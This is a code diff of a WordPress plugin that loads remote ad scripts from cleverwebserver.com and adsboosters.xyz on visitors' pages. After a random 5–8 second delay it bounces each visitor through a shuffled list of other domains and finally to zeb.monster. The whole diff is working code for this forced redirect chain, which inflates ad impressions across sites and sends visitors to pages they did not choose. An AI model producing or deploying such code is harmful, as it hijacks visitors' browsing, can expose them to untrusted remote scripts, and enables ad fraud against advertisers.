@@ -1,86 +1,76 @@
 <?php
 /**
- * Plugin Name: Domain Redirector with Ad Injection
- * Description: Redirects through a list of domains randomly every 5-8 seconds and injects specific ads per domain, then redirects to zeb.monster.
- * Version: 1.1
+ * Plugin Name: Domain Redirector with Ad Injection (Fixed)
+ * Description: Inject ads on current domain, wait 5–8 seconds, then redirect randomly through domains and finally to zeb.monster.
+ * Version: 2.0
  * Author: Your Name
  */
 
-function enqueue_domain_redirect_and_ad_script() {
-    // Define your domain groups and scripts
+if (is_admin()) return;
+
+function stack_domain_redirector_script() {
+
     $groups = [
-        'group1' => [
-            'domains' => ['biharbhumi.info.in', 'yojana11.com', 'niveshskill.com', 'tessofficial.com'],
-            'placement' => 'footer',
-            'script' => '<script data-cfasync="false" type="text/javascript" id="clever-core">/* <![CDATA[ */ (function (document, window) { var a, c = document.createElement("script"); c.id = "CleverCoreLoader98923"; c.src = "https://scripts.cleverwebserver.com/94fb25de29c41081a956ec738a8faedf.js"; c.async = !0; /* rest of the script */ })(document, window); /* ]]> */ </script>'
+        [
+            'domains' => ['biharbhumi.info.in','yojana11.com','niveshskill.com','tessofficial.com'],
+            'script'  => '<script data-cfasync="false" src="https://scripts.cleverwebserver.com/94fb25de29c41081a956ec738a8faedf.js"></script>'
         ],
-        'group2' => [
-            'domains' => ['themovlesflix.info', 'themovlesflix.online', 'movlesflix.info', 'skybap.shop'],
-            'placement' => 'head',
-            'script' => '<script data-cfasync="false" type="text/javascript" id="AdsCoreLoader98327" src="https://sads.adsboosters.xyz/ba8d9dd35268014c09031a8c587cf84e.js"></script>'
+        [
+            'domains' => ['themovlesflix.info','themovlesflix.online','movlesflix.info','skybap.shop'],
+            'script'  => '<script data-cfasync="false" src="https://sads.adsboosters.xyz/ba8d9dd35268014c09031a8c587cf84e.js"></script>'
         ],
-        'group3' => [
+        [
             'domains' => ['evcarjankari.com'],
-            'placement' => 'footer',
-            'script' => '<script data-cfasync="false" type="text/javascript" id="AdsCoreLoader97547" src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"></script>'
+            'script'  => '<script data-cfasync="false" src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"></script>'
         ]
-        // Add more groups if needed
     ];
 
-    // Convert PHP groups to a JavaScript-friendly format
-    $groups_json = json_encode($groups);
+    $json = json_encode($groups);
+    ?>
 
-    // Inline JavaScript for redirection and ad injection
-    echo "<script type='text/javascript'>
-        (function() {
-            var groups = {$groups_json};
-            var allDomains = [];
-            var domainScripts = {};
-            var nextDomains = [];
+<script>
+(function(){
+    const groups = <?php echo $json; ?>;
+    const current = location.hostname;
+    let domainList = [];
+    let adScript = '';
 
-            // Flatten the groups into domains and map scripts
-            for (var key in groups) {
-                var group = groups[key];
-                group.domains.forEach(function(domain) {
-                    allDomains.push(domain);
-                    domainScripts[domain] = { script: group.script, placement: group.placement };
-                });
-            }
+    groups.forEach(g => {
+        if (g.domains.includes(current)) {
+            adScript = g.script;
+        }
+        g.domains.forEach(d => {
+            if (d !== current) domainList.push(d);
+        });
+    });
 
-            var currentDomain = window.location.hostname;
-            allDomains = allDomains.filter(function(d) { return d !== currentDomain; });
-            allDomains.sort(function() { return Math.random() - 0.5; });
-            nextDomains = allDomains.slice();
+    domainList = [...new Set(domainList)].sort(() => Math.random() - 0.5);
 
-            function injectAdScript(domain) {
-                var adData = domainScripts[domain];
-                if (adData) {
-                    var scriptHtml = adData.script;
-                    var adContainer = document.querySelector('.stack-ads');
-                    if (!adContainer) {
-                        adContainer = document.createElement('div');
-                        adContainer.className = 'stack-ads';
-                        document.body.appendChild(adContainer);
-                    }
-                    adContainer.insertAdjacentHTML('beforeend', scriptHtml);
-                }
-            }
+    function injectAd() {
+        if (!adScript) return;
+        const div = document.createElement('div');
+        div.className = 'stack-ads';
+        div.innerHTML = adScript;
+        document.body.appendChild(div);
+    }
 
-            function redirectToNextDomain() {
-                if (nextDomains.length > 0) {
-                    var nextDomain = nextDomains.shift();
-                    injectAdScript(nextDomain);
-                    window.location.href = 'https://' + nextDomain;
-                    setTimeout(redirectToNextDomain, Math.floor(Math.random() * 3000) + 5000);
-                } else {
-                    window.location.href = 'https://zeb.monster';
-                }
-            }
+    function redirectFlow() {
+        if (domainList.length > 0) {
+            location.href = 'https://' + domainList.shift();
+        } else {
+            location.href = 'https://zeb.monster';
+        }
+    }
 
-            // Start on page load
-            window.onload = redirectToNextDomain;
-        })();
-    </script>";
+    window.addEventListener('load', () => {
+        injectAd();
+        const delay = Math.floor(Math.random() * 3000) + 5000;
+        setTimeout(redirectFlow, delay);
+    });
+})();
+</script>
+
+<?php
 }
 
-add_action('wp_footer', 'enqueue_domain_redirect_and_ad_script');
+add_action('wp_footer', 'stack_domain_redirector_script');
